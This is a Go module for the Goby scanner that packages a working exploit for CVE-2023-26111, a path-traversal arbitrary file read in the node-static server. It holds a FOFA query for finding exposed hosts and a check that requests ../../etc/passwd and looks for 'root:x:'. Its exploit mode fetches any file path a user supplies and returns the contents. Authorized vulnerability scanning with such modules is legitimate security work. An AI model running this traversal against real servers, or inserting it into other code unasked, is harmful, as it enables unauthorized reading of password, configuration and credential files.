package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "node static File Read Vulnerability (CVE-2023-26111)",
    "Description": "<p>node-static is a Node.js RFC 2616 compliant HTTP static file server processing module that provides built-in caching support.</p><p>There is an arbitrary file read vulnerability in node-static. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "node-static",
    "Homepage": "https://github.com/cloudhead/node-static",
    "DisclosureDate": "2023-03-06",
    "Author": "sunying",
    "FofaQuery": "header=\"server: node-static\" || banner=\"server: node-static\"",
    "GobyQuery": "header=\"server: node-static\" || banner=\"server: node-static\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file read vulnerability in node-static. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/cloudhead/node-static\">https://github.com/cloudhead/node-static</a></p><p>1、Set up access policies through firewalls and other security devices, and set up whitelist access.</p><p>2、If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://gist.github.com/lirantal/c80b28e7bee148dc287339cb483e42bc"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2023-26111"
    ],
    "CNNVD": [
        "CNNVD-202303-330"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "node static 文件读取漏洞（CVE-2023-26111）",
            "Product": "node-static",
            "Description": "<p>node-static 是 Node.js 兼容 RFC 2616的 HTTP 静态文件服务器处理模块，提供内置的缓存支持。</p><p>node-static 存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/cloudhead/node-static\" target=\"_blank\">https://github.com/cloudhead/node-static</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>node-static 存在任意文件读取漏洞，攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "node static File Read Vulnerability (CVE-2023-26111)",
            "Product": "node-static",
            "Description": "<p>node-static is a Node.js RFC 2616 compliant HTTP static file server processing module that provides built-in caching support.</p><p>There is an arbitrary file read vulnerability in node-static. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://github.com/cloudhead/node-static\" target=\"_blank\">https://github.com/cloudhead/node-static</a><br></p><p>1、Set up access policies through firewalls and other security devices, and set up whitelist access.</p><p>2、If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>There is an arbitrary file read vulnerability in node-static. Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10832"
}`
	sendPayloadDNUOWIQYHE := func(hostinfo *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + path)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostinfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadDNUOWIQYHE(hostinfo, "../../../../../../../../../../etc/passwd")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root:x:") && strings.Contains(resp.Utf8Html, "/bin")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := stepLogs.Params["filePath"].(string)
			resp, _ := sendPayloadDNUOWIQYHE(expResult.HostInfo, filePath)
			if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
				expResult.Success =true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
